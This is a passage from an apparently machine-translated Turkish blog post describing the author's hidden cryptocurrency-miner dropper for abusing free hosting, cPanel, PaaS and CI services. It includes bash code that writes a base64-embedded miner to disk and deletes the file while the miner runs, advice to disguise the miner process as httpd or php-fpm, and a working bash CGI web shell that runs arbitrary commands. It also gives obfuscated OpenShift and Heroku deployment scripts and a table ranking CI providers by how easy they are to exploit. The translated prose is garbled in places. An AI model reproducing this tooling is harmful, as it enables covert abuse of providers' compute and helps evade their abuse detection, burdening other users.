				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Bu, yalnızca tek satırları düzenlememize izin verir, çok satırlı girişler için sadece ilk satırı dikkate alır. ama bizim kullanım durumumuz için yeterince iyidir.<h2 id=runtime><a class=header-anchor href=#runtime> Çalışma süresi</a></h2><p>Çalışma zamanımız neye benziyor? Ana döngüyü yürüten bir ana bash işlemimiz var, ardından madenci alt işlemi, işlemci izleme alt işlemi, dolap ve ayarlayıcı. Bu neredeyse bir avuç.<p>Öncelikle, bir şeyler ters giderse, bir karışıklık bırakmadığımızdan emin olmak istiyoruz, bu, sonlandırmada temizlik yapmak için bir bash tuzağı kullandığımız anlamına gelir.<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> özyinelemeyi önlemek için tuzağı kaldırır. Tuzak tüm işleri öldürür ve çalışma ortamını ortadan kaldırır.<p>Base64 kodlamasında bash değişkeni olarak saklanan madenciyi başlatma zamanı. Dosya sistemine dökeriz, sonra yapılandırmayı atarız, madenciyi çalıştırırız ve hem madenciyi hem de yapılandırmayı kaldırırız. Linux'ta çalışan bir işlemin yürütülebilir dosyasını kaldırabilirsiniz (pencerelerde buna izin verilmez).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Madenci çalışırken, dosya sisteminde sadece bir<code>.. /</code> ile dizin<code>b64</code> içindeki bağlantı.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Madenciyi kodlarken bash ile karşılaşılan çıldırtıcı bir tuhaflık, tırnaklı bir alt kabuğa sahip bir değişken atamaktır.<code>myvar="$(something)"</code> bellek kullanımında kalıcı bir artışa neden olur, bunun hata ayıklaması zordu ve neden böyle davrandığını gerçekten bulamadık, zaten atamanın alıntılanmaması gerekiyor. Bunun yerine kod çözme ile yapılır<em> atasözleri</em> geçici dosyalar üzerinde bir soyutlama olan değişken, daha sonra işleme geri gönderilen bir dosyaya atılır.<p>Madenci uzun koşu döngüsü:<ul><li><p>doğru iken<ul><li><p>madenciyi durdur<li><p>yapılandırmayı kaldır<li><p>madenciyi başlat<li><p>doğru iken<ul><li><p>arka plan programını başlat<ul><li><p>madenci çalışırken<ul><li><p>madenciden çıktıyı oku<li><p>çıktı satırına göre madenci eylemi seçin</ul></ul><li><p>madenci çalışmıyorsa: ara</ul><li><p>uyku</ul></ul><p>Çıktı satırı bazı normal ifadelerle eşleştirilir:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Daemon şu durumlarda çalışır:<ul><li><p>uç noktaya bağlantı hata veriyor (yeni bir rastgele uç nokta seçin)<li><p>karma algoritma değişir (uyku süresini ve geçici yapılandırmaları ayarlayın)<li><p>madenci sorunları (madenciyi yeniden başlatın).</ul><p>Bir süredir, manuel yeniden başlatmaları tetiklemeye izin veren komuta ve kontrol panosu için destek vardı, ancak kullanımının minimum düzeyde olması nedeniyle atıldı ve uç noktaları alternatif bir havuz bağlantısıyla değiştirildi, ayrıca yeniden başlatma işlemi kararsız ve karmaşıktı. ..bir başka teknik borç örneği. Bununla birlikte, güncellenmiş bir yükü yeniden getirmeye ve tüm konfigürasyonları anında yeniden kurmaya izin verdi, ki bu oldukça havalı, nihai trambolindi.<h2 id=debugging><a class=header-anchor href=#debugging> hata ayıklama</a></h2><p>Üç ana yardımcı program vardır<ul><li><p>kod blokları etrafında izlemeyi etkinleştir/devre dışı bırak (bir değişkende b64 ile kodlanmış bir ikili dosyayı izlemek istemiyoruz ..)<li><p>günlükleri biçimlendirmek için basit bir işlev<li><p>madenci her başlatıldığında çalışma zamanında ayrıntılı günlüğe kaydetmeyi etkinleştirecek bir bayrak.<ul><li><p>dosya mı<code>.debug</code> mevcut?<ul><li><p>ayrıntılı günlük kaydını etkinleştir</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Hedef dağıtımlar</a></h2><p>Bu kurulum 3 tür ana bilgisayar üzerinde test edilmiştir:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Kendi kendine barındırılan kapsayıcılar veya VM'ler</a></h3><p>Çoğu barındırma sağlayıcısı, CPU kaynakları birden çok kullanıcı arasında paylaşıldığı için madenciliği sevmez ve madencilik yazılımı, diğer kullanıcıların performansını etkileyen bir ana bilgisayar düğümünü kolayca yavaşlatabilir. Bu, CPU kullanıcı süresi sınırsız olsa bile doğru olabilir, çünkü önbellek tüm CPU çekirdekleri arasında paylaşılıyorsa, karma algoritmalar CPU'nun tüm önbelleğe alma katmanlarını doyurabilir.<p>bizimkini kullanmak isteriz<em> adil</em> kaynakların yasaklanmadan paylaşılması, bu, ana bilgisayar kullanımının farkında olduğu için gizli damlalığımız için iyi bir kullanım durumudur, yani<em> NS</em> [AUP] içinde kalın. Kendi kendine barındırılan dağıtımlarla uğraşırken ekstra adım yoktur, yalnızca başlatıcı komut dosyası, önyükleme sırasına eklenebilir veya manuel olarak başlatılabilir.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanel tabanlı web barındırma</a></h3><p>Web barındırma abonelik planları çoğunlukla [cPanel] aracılığıyla sunulur. Yine burada makul kaynak sınırlarına sahip kişisel abonelik planları kullanıyoruz, diğer yandan herhangi bir ücretsiz planın saçma sınırları var<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel, farklı dosya uzantıları için işleyiciler tanımlamanıza izin verir; bu, kabuk komut dosyalarını aşağıdakiler aracılığıyla yürütmemize olanak tanır.<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> sunucuya yüklenen bir kabuk komut dosyasına karşı bir http isteği ile. Bu tür arayüzler, web kabuklarının neye benzediğidir.<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Basit bir bash web kabuğu<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Web hapishanelerinde ek işlemlere izin verilmeyebileceğinden, yalnızca yerleşiklere güvenmek daha iyidir, ancak her zaman mümkündür.<code>exec</code> bu da çoğu komut satırı yardımcı programını kullanmamıza izin verir. Çoğu web kabuğu, çatallama konusunda endişelenmenize gerek olmadığı için python veya php gibi diğer komut dosyası dillerinde yazılmıştır.<p>Bir cpanel ortamında, madenci işlemi için statik bir ad kullanmak daha iyidir, örneğin:<code>httpd</code> veya<code>php-fpm</code> Çünkü<code>cgi</code> çoklu işlemeye dayalıdır, bu nedenle sunucular her zaman bunun gibi birçok işlemle doldurulur, ancak dikkatli bir gözlemcinin fark etmesi gerekir.<em> çok iş parçacıklı</em> perl, php, ruby ​​veya python gibi diller için kesinlikle yaygın olmayan (veya mümkün olmayan) kullanım kalıbı!<p>İşlemlerin ayrıca varsayılan olarak bir zaman sınırı vardır (1 saat, 1 gün, vb.), bunun için sadece dropper'ı yeniden başlatan bir cron işi kullanıyoruz.<p>Bu, çok fazla manuel düzenleme gerektiriyordu, bunu otomatikleştirmek için cpanel api ne yazık ki son kullanıcılara açık değil, bu nedenle web barındırma madenci dropper'ımız için hantal ve sıkıcı bir hedef.<h3 id=web_environments><a class=header-anchor href=#web_environments> Web ortamları</a></h3><p>Var<em> Hizmet Olarak Sunulan Yazılımlar</em> gibi bir kapsayıcı ile birleştirilmiş bir web düzenleyicisine sahip sağlayıcılar<a href="with a free tier before getting acquired by amazon"> Bulut 9</a> , [codeanywhere], [codeanvy]. Dropper'ı buraya yerleştirmek kolaydır (tam teşekküllü bir ortamınız vardır), ancak herhangi bir etkileşimli web düzenleyicisi, web sayfası kapatıldıktan hemen sonra oturumunu sonlandırdığından ve bunun sonucunda kapsayıcı uyku moduna geçtiğinden, onu çalışır durumda tutmak bir yüktür. tabii ki ödeyin).<p>Bunu atlatmak, yalnızca oturumları açık tutmamız gerektiği anlamına gelebilir, [kuklacı] ile bazı komut dosyaları istenen sonucu elde etti, ancak uzun süredir çalışan, bellek sızıntısı yapan, şişmiş SPA web sayfalarına sahip olmak kesinlikle çekici değil ve gizli değil, çünkü sağlayıcı arka ucundan, 7/24 açılan bir oturum kesinlikle şüpheli görünecektir. Aslında, web ortamları da hantal ve sıkıcı hedeflerdir.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Ücretsiz uygulama hizmetleri</a></h3><p>Bu esas olarak<a href="when it used to have a free tier"> açık vardiya</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> ve [heroku]. Openshift, kubernetes olmak biraz kolaydı, ancak yapılandırma karmaşasıyla dolu, işte bir alıntı:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Bu, bir yaml şablonu gerektiren madencilik kapsayıcısını oluşturmak için kullanılan komut dosyasıydı:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Ancak tüm süreç oldukça fazla adım içeriyordu!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Sözde kodda:<ul><li><p>projeyi oluştur<li><p>resim olmadan uygulamayı oluşturun<li><p>madencilik konteynerini inşa et<li><p>kapsayıcıyı bir dağıtım yapılandırmasıyla dağıtın (kubernetes soyutlaması)<li><p>dağıtımı devreye al</ul><p>NS<code>build-build</code> komut dosyaları bunun yerine bir<em> yapı</em> bir seferde birkaç saat maden çıkaran konteyner. Derlemeler ve normal bölmeler, açık vardiyada ayrı kaynaklara sahiptir, bu yüzden her ikisini de kullandık. Openshift genel olarak kötü bir deneyimdi çünkü 4 farklı sürümden (belki daha fazla, bir süre sonra izlemeyi bıraktım) ve her biri yapılandırmalarda değişiklik gerektiriyordu, yükseltme yolları yoktu ve her şey hızlı bir şekilde yinelendi ve yaygındı. derlemelerin/bölmelerin durması ve çöp toplanmaması için ... genellikle arada bir manuel yeniden başlatmalar yaptılar, belki kubernet'ler sadece sorunluydu :)<p>Heroku yapılandırması biraz daha basitti (kubernet'leri içermiyor). Openshift'e benzeyen konteyner yapısı dışında, gerisi sadece iki cli komutuydu.<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Kap, docker ile doğrudan heroku kayıt defterine itildi.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Heroku ile olan sürtüşme (ki ücretsiz katman, yazma zamanına kadar ayakta kalır), dynos'un ayda yalnızca 22 gün çalışabilmesidir, bu nedenle her ay biraz manuel yönetim gerektirdi, yine hantal ve sıkıcıydı. Başlangıçta bazı ban wave'leri uyguladılar ve ardından TOR üzerinden kayıtları devre dışı bıraktılar, bunun nedeninin ben olduğumdan oldukça eminim.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI kapsayıcıları veya VM'ler</a></h3><p>Bunlar, damlalığımız için en sinerjik hedeflerdi. Çok var<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> Birçoğu, teknoloji altyapısı işinde bir miktar pazar payı toplama umuduyla ücretsiz katmanlar sunan yatırımcıların parasını yakan şirketler.<p>Tüm bu hizmetler farklı kaynaklar sunar, farklı yapılandırma gereksinimlerine sahiptir ve farklı ortamlarda çalışır. Hesap kaydını otomatikleştirmeyi hiç düşünmedim çünkü bu tür şeyleri programlamak korkunç, onlardan her zaman kaçınmaya çalışıyorum, bu yüzden ne tür bir istenmeyen posta önleme yanıtı alacağımı merak ettiğim için bir süre manuel kayıtlara katlandım (ve diğerlerinden ne kadar farklı!). Bir şirketin yönetimi hakkında bazı şeyleri spam'i nasıl ele aldığından tahmin edebilirsiniz:<ul><li><p>Ban wave yapıyor mu? Daha sonra katı olmayan politikaları vardır, sorunlar elle ve duruma göre ele alınır.<li><p>Telefon doğrulaması gerektiriyor mu? Geçmişte tacize uğradılar<li><p>Yoğun kaynak kullanımına yanıt veriyorlar mı? Sıkı bir bütçeyle çalışıyorlar<li><p>Hesap kısıtlamaları mı yoksa gölge yasakları mı uyguluyorlar? Gölge yasağı varsa, kötü sistem yöneticileri vardır.</ul><p>Felsefi bir soru da var: Bir hizmet, sistemlerini uzun süre kötüye kullanmanıza izin veriyorsa, bu, yükü kaldırabilecek raf üstü bir altyapıya sahip oldukları veya sadece sistemleri üzerinde zayıf kontrole sahip oldukları anlamına mı gelir? Erişilebilirlik ve güvenlik arasındaki dengeyi de göz önünde bulundurmalısınız, çok güvenli bir sistem, kullanıcı tutma oranını azaltabilir.<p>Dağıttığım bazı hizmetleri gösteren bir tablo:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>yapılandırma<th style=text-align:center>verim<th style=text-align:center>yasak çekiç<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>kötü<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<td style=color:green;text-align:center>iyi<tr><td style=text-align:center>kod gemisi<td style=color:#ff0;text-align:center>orta<td style=color:red;text-align:center>kötü<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>orta<td style=color:green;text-align:center>iyi<td style=color:green;text-align:center>iyi<tr><td style=text-align:center>Çemberci<td style=color:red;text-align:center>kötü<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Semafor<td style=color:green;text-align:center>iyi<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Liman işçisi<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<td style=color:green;text-align:center>iyi<tr><td style=text-align:center>İskele<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Kod tazeleme<td style=color:red;text-align:center>kötü<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<td style=color:red;text-align:center>kötü<tr><td style=text-align:center>Azure ardışık düzenleri<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<td style=color:red;text-align:center>kötü<tr><td style=text-align:center>sürekliphp<td style=color:red;text-align:center>kötü<td style=color:#ff0;text-align:center>orta<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>ahbap<td style=color:red;text-align:center>kötü<td style=color:red;text-align:center>kötü<td style=color:red;text-align:center>kötü<tr><td style=text-align:center>Uçan göz<td style=color:red;text-align:center>kötü<td style=color:green;text-align:center>iyi<td style=color:red;text-align:center>kötü<tr><td style=text-align:center>Uygulamacı<td style=color:red;text-align:center>kötü<td style=color:#ff0;text-align:center>orta<td style=color:red;text-align:center>kötü<tr><td style=text-align:center>asla kodlama<td style=color:red;text-align:center>kötü<td style=color:green;text-align:center>iyi<td style=color:#ff0;text-align:center>orta<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>kötü<td style=color:green;text-align:center>iyi<td style=color:red;text-align:center>kötü</table><p>Bu bağlamda, bir<span style=color:green> iyi</span> yapılandırma, bir yapılandırmayı yapılandırmanın fazla zaman almadığı anlamına gelir.<code>ci</code> madencilik süreci için bir iş (depo nokta dosyası yerine bir web panosuna dayanan tüm hizmetlerin bir angarya olması gibi), bir<span style=color:red> kötü</span><code>ban-hammer</code> hizmete kaydolmanın zor olduğu veya hesapların daha agresif bir şekilde yasaklanacağı anlamına gelir.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> bir proje kurmayı, çevreyi, hedef mimariyi, yürütme sürecini ve diğer şeyleri çıkarmayı gerektiriyor, bir yapıyı kurmak çok zaman alıyordu, bu yüzden yapılandırmada kötü bir puan aldı.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> sürekliphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> ahbap</a> , [Codefresh] ayrıca birçok manuel bildirimsel olmayan yapılandırma adımına sahipti.<p>[Azure-boru hatları] gibi hizmetler,<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> ahbap</a> hesaplara gölge yasakları uygular, gölge yasakları kötüdür, çünkü yapılandırmanızda bir sorun olup olmadığını tahmin etmenizi sağlar. Bazı hizmetlerde yasağın nedenini tahmin edebilirsiniz (hemen hemen derlemeniz çok fazla zaman aldı veya kısa sürede çok fazla inşa ettiniz), [Azure-pipelines] gibi diğerleri için bir çeşit parmak izi uyguladıklarını varsayıyorum Kaynakların kötüye kullanılması olmadan bile yasaklar geldiği için kullanıcı havuzlarına, azure ve vercel de kısıtlandı<code>DNS</code> kamuya açık inşa makineleri içinde erişim, bu yüzden geçici tünel ile üstesinden gelinmesi gereken ek sürtünme oldu.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Uçan göz</a> 16+ çekirdekli işlemcinin tamamına erişim sağladı ancak 2 derlemeden sonra yasaklandı<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> kod gemisi</a> ayrıca güçlü yapı ana bilgisayarlarına erişim sağlar ve drone kadar agresif bir şekilde yasaklamaz.<p>En sevdiğim hizmetler karlılık nedeniyle değil, kolaylık ve rahatlık için (diğer projelerde de)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semafor</a> ve<a 